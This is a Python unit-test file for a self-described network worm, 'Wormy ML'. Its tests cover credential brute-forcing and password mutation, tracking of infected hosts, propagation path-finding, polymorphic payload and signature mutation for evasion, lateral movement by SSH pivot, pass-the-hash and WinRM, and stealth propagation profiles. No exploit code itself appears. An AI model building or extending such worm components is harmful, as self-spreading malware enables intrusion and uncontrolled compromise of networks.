"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Unit tests for core Wormy modules
"""


import os
import sys
import unittest
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestCredentialManager(unittest.TestCase):
    """Test CredentialManager"""

    def test_credential_manager_init(self):
        """Test CredentialManager initialization"""
        try:
            from exploits.credential_manager import CredentialManager

            cm = CredentialManager(wordlist_dir="wordlists")
            self.assertGreater(cm.stats["total_loaded"], 0)
        except ImportError:
            self.skipTest("CredentialManager not available")

    def test_get_credentials_for_service(self):
        """Test credential selection by service"""
        try:
            from exploits.credential_manager import CredentialManager

            cm = CredentialManager(wordlist_dir="wordlists")
            creds = cm.get_credentials_for_service("ssh", limit=10)
            self.assertGreater(len(creds), 0)
            self.assertLessEqual(len(creds), 10)
        except ImportError:
            self.skipTest("CredentialManager not available")

    def test_add_discovered_credential(self):
        """Test adding discovered credentials"""
        try:
            from exploits.credential_manager import CredentialManager

            cm = CredentialManager(wordlist_dir="wordlists")
            initial = len(cm.get_discovered_credentials())
            cm.add_discovered_credential("admin", "password123")
            after = len(cm.get_discovered_credentials())
            self.assertEqual(after, initial + 1)
        except ImportError:
            self.skipTest("CredentialManager not available")

    def test_password_mutations(self):
        """Test password mutation engine"""
        try:
            from exploits.credential_manager import CredentialMutationEngine

            engine = CredentialMutationEngine()
            variants = engine.mutate("password", max_variants=10)
            self.assertGreater(len(variants), 0)
        except ImportError:
            self.skipTest("CredentialMutationEngine not available")

    def test_lockout_tracking(self):
        """Test lockout detection"""
        try:
            from exploits.credential_manager import CredentialManager

            cm = CredentialManager(wordlist_dir="wordlists")

            for i in range(6):
                cm.record_attempt("192.168.1.100", "admin", False)

            is_locked = cm._is_locked_out("192.168.1.100", "admin", threshold=5)
            self.assertTrue(is_locked)
        except ImportError:
            self.skipTest("CredentialManager not available")


class TestKnowledgeGraph(unittest.TestCase):
    """Test NetworkKnowledgeGraph"""

    def test_add_host(self):
        """Test adding hosts"""
        try:
            from core.knowledge_graph import NetworkKnowledgeGraph

            kg = NetworkKnowledgeGraph()
            kg.add_host("192.168.1.1", os_guess="Linux", ports=[22, 80])
            self.assertEqual(kg.stats["hosts"], 1)
        except ImportError:
            self.skipTest("KnowledgeGraph not available")

    def test_mark_infected(self):
        """Test marking hosts as infected"""
        try:
            from core.knowledge_graph import NetworkKnowledgeGraph

            kg = NetworkKnowledgeGraph()
            kg.add_host("192.168.1.1")
            kg.mark_infected("192.168.1.1", "ssh_pivot")
            infected = kg.get_infected_hosts()
            self.assertIn("192.168.1.1", infected)
        except ImportError:
            self.skipTest("KnowledgeGraph not available")

    def test_bfs_path_finding(self):
        """Test BFS path finding"""
        try:
            from core.knowledge_graph import NetworkKnowledgeGraph

            kg = NetworkKnowledgeGraph()
            kg.add_host("192.168.1.1", is_infected=True)
            kg.add_host("192.168.1.2")
            kg.add_host("192.168.1.3")
            kg.add_reachability("192.168.1.1", "192.168.1.2")
            kg.add_reachability("192.168.1.2", "192.168.1.3")

            path = kg.find_propagation_path("192.168.1.1", "192.168.1.3")
            self.assertIsNotNone(path)
            self.assertEqual(path[0], "192.168.1.1")
            self.assertEqual(path[-1], "192.168.1.3")
        except ImportError:
            self.skipTest("KnowledgeGraph not available")

    def test_network_summary(self):
        """Test network summary"""
        try:
            from core.knowledge_graph import NetworkKnowledgeGraph

            kg = NetworkKnowledgeGraph()
            kg.add_host("192.168.1.1", is_infected=True)
            kg.add_host("192.168.1.2")
            summary = kg.get_network_summary()
            self.assertEqual(summary["total_hosts"], 2)
            self.assertEqual(summary["infected_hosts"], 1)
        except ImportError:
            self.skipTest("KnowledgeGraph not available")


class TestPolymorphicEngine(unittest.TestCase):
    """Test PolymorphicEngine"""

    def test_mutate_payload(self):
        """Test payload mutation"""
        try:
            from evasion.polymorphic_engine import PolymorphicEngine

            engine = PolymorphicEngine(mutation_level=2)
            payload = 'x = "hello"; y = "world"; print(x + y)'
            mutated = engine.mutate_payload(payload)
            self.assertNotEqual(mutated, payload)
        except ImportError:
            self.skipTest("PolymorphicEngine not available")

    def test_network_signature_mutation(self):
        """Test network signature mutation"""
        try:
            from evasion.polymorphic_engine import PolymorphicEngine

            engine = PolymorphicEngine()
            sig = engine.mutate_network_signature()
            self.assertIn("user_agent", sig)
            self.assertIn("jitter", sig)
            self.assertIn("ttl", sig)
        except ImportError:
            self.skipTest("PolymorphicEngine not available")

    def test_timing_delay(self):
        """Test random timing delay"""
        try:
            from evasion.polymorphic_engine import PolymorphicEngine

            engine = PolymorphicEngine()
            delay = engine.get_timing_delay(1.0)
            self.assertGreater(delay, 0)
        except ImportError:
            self.skipTest("PolymorphicEngine not available")


class TestLateralMovement(unittest.TestCase):
    """Test LateralMovementEngine"""

    def test_select_technique(self):
        """Test technique selection"""
        try:
            from post_exploit.lateral_movement import LateralMovementEngine

            engine = LateralMovementEngine()

            # SSH with password
            technique = engine._select_best_technique(
                [22], "Linux", {"username": "root", "password": "toor"}
            )
            self.assertEqual(technique, "ssh_pivot")

            # Pass-the-hash
            technique = engine._select_best_technique(
                [445], "Windows", {"username": "admin", "hash": "abc123"}
            )
            self.assertEqual(technique, "pass_the_hash")

            # WinRM
            technique = engine._select_best_technique(
                [5985], "Windows", {"username": "admin", "password": "pass"}
            )
            self.assertEqual(technique, "winrm")
        except ImportError:
            self.skipTest("LateralMovementEngine not available")

    def test_bfs_path_finding(self):
        """Test optimal path finding"""
        try:
            from post_exploit.lateral_movement import LateralMovementEngine

            engine = LateralMovementEngine()

            graph = {
                "192.168.1.1": ["192.168.1.2", "192.168.1.3"],
                "192.168.1.2": ["192.168.1.4"],
                "192.168.1.3": ["192.168.1.5"],
            }

            path = engine.get_optimal_path("192.168.1.1", "192.168.1.4", graph)
            self.assertIsNotNone(path)
            self.assertEqual(path, ["192.168.1.1", "192.168.1.2", "192.168.1.4"])
        except ImportError:
            self.skipTest("LateralMovementEngine not available")


class TestAsyncScanner(unittest.TestCase):
    """Test AsyncScanner"""

    def test_expand_targets(self):
        """Test CIDR expansion"""
        try:
            from scanner.async_scanner import AsyncScanner

            scanner = AsyncScanner()
            ips = scanner._expand_targets(["192.168.1.0/30"])
            self.assertEqual(len(ips), 2)  # .1 and .2
        except ImportError:
            self.skipTest("AsyncScanner not available")

    def test_vuln_score(self):
        """Test vulnerability scoring"""
        try:
            from scanner.async_scanner import AsyncScanner

            score = AsyncScanner._calculate_vuln_score([445, 3389, 22], {}, {})
            self.assertGreater(score, 0)
            self.assertLessEqual(score, 100)
        except ImportError:
            self.skipTest("AsyncScanner not available")


class TestConfigProfiles(unittest.TestCase):
    """Test configuration profiles"""

    def test_profile_values(self):
        """Test profile overrides exist"""
        try:
            from worm_core import CONFIG_PROFILES

            self.assertIn("stealth", CONFIG_PROFILES)
            self.assertIn("aggressive", CONFIG_PROFILES)
            self.assertIn("audit", CONFIG_PROFILES)

            self.assertGreater(
                CONFIG_PROFILES["stealth"]["propagation_delay"],
                CONFIG_PROFILES["aggressive"]["propagation_delay"],
            )
        except ImportError:
            self.skipTest("WormCore not available")


class TestHostClassifier(unittest.TestCase):
    """Test HostClassifier"""

    def test_rule_based_classification(self):
        """Test rule-based host classification"""
        try:
            from scanner import HostClassifier

            classifier = HostClassifier()

            # Windows DC
            host = {"open_ports": [135, 139, 445, 3389], "banners": {}}
            result = classifier._rule_based_classify(host)
            self.assertEqual(result, "domain_controller")

            # Database
            host = {"open_ports": [3306, 22], "banners": {}}
            result = classifier._rule_based_classify(host)
            self.assertEqual(result, "database")

            # Web server
            host = {"open_ports": [80, 443], "banners": {}}
            result = classifier._rule_based_classify(host)
            self.assertEqual(result, "web_server")
        except ImportError:
            self.skipTest("HostClassifier not available")


class TestAuditReport(unittest.TestCase):
    """Test AuditReportGenerator"""

    def test_generate_report(self):
        """Test report generation"""
        try:
            import tempfile

            from utils.audit_report import AuditReportGenerator

            gen = AuditReportGenerator()
            with tempfile.TemporaryDirectory() as tmpdir:
                files = gen.generate(
                    worm_stats={"scans": 1, "infections": 2, "total_hosts_discovered": 5},
                    scan_results=[{"ip": "192.168.1.1", "open_ports": [22], "os_guess": "Linux"}],
                    infected_hosts={"192.168.1.1"},
                    failed_targets=set(),
                    output_dir=tmpdir,
                )
                self.assertIn("json", files)
                self.assertIn("csv", files)
                self.assertIn("text", files)

                for fmt, path in files.items():
                    self.assertTrue(os.path.exists(path))
        except ImportError:
            self.skipTest("AuditReportGenerator not available")


if __name__ == "__main__":
    unittest.main(verbosity=2)
